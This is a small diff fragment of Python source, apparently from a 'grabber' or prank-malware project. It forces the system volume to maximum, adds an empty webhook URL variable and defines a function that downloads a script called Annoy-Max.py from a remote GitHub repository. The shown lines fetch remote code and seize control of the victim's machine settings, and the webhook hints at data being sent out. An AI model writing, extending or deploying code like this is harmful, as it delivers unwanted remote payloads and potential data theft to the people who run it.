@@ -8,6 +8,7 @@ volume.SetMasterVolumeLevelScalar(1.0, None)
 import requests
 import os
 import shutil
+webhook_url = ""
 def download_another_file():
     url = "https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Annoy-Max.py"
     response = requests.get(url)
